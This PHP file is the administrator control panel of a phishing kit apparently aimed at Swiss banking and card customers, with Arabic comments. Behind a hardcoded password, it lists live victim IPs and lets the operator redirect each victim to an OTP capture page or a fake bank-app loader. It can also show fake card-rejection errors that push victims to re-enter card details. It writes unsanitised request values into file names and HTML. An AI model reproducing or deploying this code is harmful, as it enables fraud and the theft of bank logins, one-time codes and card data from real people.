<?php
if (session_status() == PHP_SESSION_NONE) { session_start(); }

// 🔒 تعيين كلمة المرور الخاصة بك هنا
define('ADMIN_PASSWORD', '111110'); 

// معالجة تسجيل الخروج
if (isset($_GET['logout'])) {
    unset($_SESSION['admin_logged_in']);
    header("Location: control.php");
    exit();
}

// التحقق من إرسال نموذج تسجيل الدخول
$login_error = false;
if (isset($_POST['password'])) {
    if ($_POST['password'] === ADMIN_PASSWORD) {
        $_SESSION['admin_logged_in'] = true;
        header("Location: control.php" . (isset($_GET['target']) ? "?target=" . $_GET['target'] : ""));
        exit();
    } else {
        $login_error = true;
    }
}

// 🛡️ حماية الصفحة: لو مش مسجل دخول، اعرض صفحة قفل الباسورد فوراً
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Dashboard Authorization - Locked</title>
        <style>
            body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
            .login-box { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 320px; text-align: center; }
            h2 { color: #1e293b; margin-bottom: 10px; font-size: 22px; }
            p { color: #64748b; font-size: 13px; margin-bottom: 20px; }
            .lock-icon { font-size: 40px; color: #e77600; margin-bottom: 15px; }
            input[type="password"] { width: 100%; height: 36px; padding: 0 10px; border: 1px solid #cbd5e1; border-radius: 4px; box-sizing: border-box; font-size: 14px; outline: none; margin-bottom: 15px; text-align: center; }
            input[type="password"]:focus { border-color: #e77600; box-shadow: 0 0 3px rgba(231,118,0,0.4); }
            .btn-login { width: 100%; height: 36px; background: #e77600; border: none; color: #fff; font-size: 14px; font-weight: bold; border-radius: 4px; cursor: pointer; transition: background 0.2s; }
            .btn-login:hover { background: #cc6800; }
            .err-msg { color: #dc2626; font-size: 12px; font-weight: 500; margin-bottom: 15px; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="lock-icon">🔒</div>
            <h2>Authorization Required</h2>
            <p>Enter administrative key to unlock dashboard</p>
            
            <?php if ($login_error): ?>
                <div class="err-msg">❌ Access Denied: Invalid Key!</div>
            <?php endif; ?>
            
            <form action="" method="POST" autocomplete="off">
                <input type="password" name="password" placeholder="••••••••••••" required autofocus>
                <button type="submit" class="btn-login">Unlock Dashboard</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit(); // إيقاف تنفيذ باقي الكود لمنع استبصار اللوحة بدون الباسورد
}

// -------------------------------------------------------------
// بقية منطق التحكم الأصلي (يشتغل فقط لو تخطى حماية الباسورد بنجاح)
// -------------------------------------------------------------

// تحديد الهدف الحالي (الـ IP المراد التحكم فيه ديناميكياً)
$target = isset($_GET['target']) ? $_GET['target'] : '';

if (!empty($target)) {
    // معالجة الأوامر المرسلة للـ IP الممرر من اللوحة أو التلغرام
    if (isset($_GET['action'])) {
        $action = $_GET['action'];
        if (in_array($action, ['wait', 'otp', 'bank', 'card_wrong', 'card_expired', 'card_unsupported', 'index'])) {
            // إنشاء أو تحديث ملف الأوامر الخاص بهذا الآي بي بالذات
            file_put_contents("status_" . $target . ".txt", $action);
            header("Location: control.php?target=" . $target . "&success=1");
            exit();
        }
    }
    // قراءة الحالة الحالية لهذا الآي بي من ملفه الخاص
    $current_status = file_exists("status_" . $target . ".txt") ? trim(file_get_contents("status_" . $target . ".txt")) : 'wait';
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Multi-User Live Dashboard - Admin Control Panel</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f8fafc; padding: 30px; color: #334155; text-align: center; }
        .container { max-width: 650px; margin: 0 auto; background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); text-align: left; position: relative; }
        h2 { color: #1e293b; text-align: center; margin-bottom: 20px; font-size: 24px; }
        h3 { color: #475569; font-size: 16px; margin-top: 20px; margin-bottom: 15px; border-left: 3px solid #e77600; padding-left: 8px; }
        .user-card { background: #f1f5f9; padding: 15px; border-radius: 6px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #e2e8f0; }
        .btn { display: block; padding: 12px; margin: 10px 0; font-size: 15px; font-weight: bold; color: #fff; border: none; border-radius: 6px; cursor: pointer; text-decoration: none; text-align: center; transition: opacity 0.2s; }
        .btn:hover { opacity: 0.9; }
        .btn-control { background: #10b981; padding: 8px 16px; font-size: 13px; font-weight: bold; border-radius: 4px; }
        .btn-wait { background: #475569; } .btn-otp { background: #f59e0b; } .btn-bank { background: #3b82f6; }
        .btn-danger { background: #dc2626; } .btn-dark { background: #1e293b; }
        .success-alert { background: #d4edda; color: #155724; padding: 10px; border-radius: 6px; margin-bottom: 15px; text-align: center; font-weight: 500; }
        .status-badge { padding: 3px 10px; background: #e77600; color: #fff; border-radius: 4px; font-weight: bold; font-size: 12px; }
        .logout-link { position: absolute; top: 15px; right: 25px; font-size: 12px; color: #dc2626; text-decoration: none; font-weight: bold; }
        .logout-link:hover { text-decoration: underline; }
    </style>
</head>
<body>

<div class="container">
    <a href="control.php?logout=1" class="logout-link">🔒 Logout</a>

    <?php if (empty($target)): ?>
        <h2>🟢 Live Active Visitors Logs</h2>
        <p style="text-align:center; color:#64748b; margin-bottom:20px; font-size:14px;">Select a visitor below to launch their independent command center.</p>
        
        <?php
        $files = glob('user_*.json');
        $active_count = 0;
        foreach ($files as $file) {
            $data = json_decode(file_get_contents($file), true);
            // نعتبر المستخدم متصل لو تفاعل مع أي صفحة في آخر 60 ثانية
            if ($data && (time() - $data['last_activity']) < 60) {
                $active_count++;
                $clean_ip_name = str_replace(['user_', '.json'], '', $file);
                echo '<div class="user-card">';
                echo '<div><b>Target IP:</b> ' . $data['ip'] . '<br><small style="color:#64748b; font-weight:500;">Current Page: <span style="color:#0066c0">' . $data['current_page'] . '</span></small></div>';
                echo '<a href="control.php?target=' . $clean_ip_name . '" class="btn btn-control">🛰️ Manage User</a>';
                echo '</div>';
            }
        }
        if ($active_count === 0) {
            echo '<p style="text-align:center; color:#94a3b8; padding:30px; font-size:14px;">No active visitors surfing the site right now.</p>';
        }
        ?>

    <?php else: ?>
        <h2>Live Command Center 🚀</h2>
        <p style="text-align: center; font-family: monospace; font-weight: bold; background: #e2e8f0; padding: 8px; border-radius: 4px; color: #1e293b;">
            Managing IP: <?php echo str_replace('_', '.', $target); ?>
        </p>
        
        <?php if (isset($_GET['success'])): ?>
            <div class="success-alert">✓ System command deployed to this visitor successfully!</div>
        <?php endif; ?>

        <p style="font-size: 14px; margin-top: 15px;">Active Command Status: <span class="status-badge"><?php echo $current_status; ?></span></p>
        <hr style="border:0; border-top:1px solid #e2e8f0; margin: 15px 0;">

        <h3>1. Flow Redirection Commands:</h3>
        <a href="control.php?target=<?php echo $target; ?>&action=wait" class="btn btn-wait">⏳ Keep User in Waiting Screen (lod2.php)</a>
        <a href="control.php?target=<?php echo $target; ?>&action=otp" class="btn btn-otp">💬 Redirect to SMS OTP Gateway (smbettal.php)</a>
        <a href="control.php?target=<?php echo $target; ?>&action=bank" class="btn btn-bank">📱 Redirect to Schweizer Bank-App Loader (bankid.php)</a>
        
        <h3>2. Reject Card Operations (Triggers Custom Errors):</h3>
        <a href="control.php?target=<?php echo $target; ?>&action=card_wrong" class="btn btn-danger">❌ Error: Incorrect Card Details (Wrong Number/CVC)</a>
        <a href="control.php?target=<?php echo $target; ?>&action=card_expired" class="btn btn-danger">📅 Error: Card Expired</a>
        <a href="control.php?target=<?php echo $target; ?>&action=card_unsupported" class="btn btn-danger">🚫 Error: Card Not Eligible / Unsupported in CH</a>

        <h3>3. Session Management:</h3>
        <a href="control.php?target=<?php echo $target; ?>&action=index" class="btn btn-dark">🔄 Terminate Session (Redirect to Home)</a>
        
        <hr style="border:0; border-top:1px solid #e2e8f0; margin: 20px 0;">
        <a href="control.php" class="btn btn-dark" style="background:#64748b;"><i class="fa-solid fa-arrow-left"></i> Return to Main Visitors List</a>
    <?php endif; ?>
</div>

</body>
</html>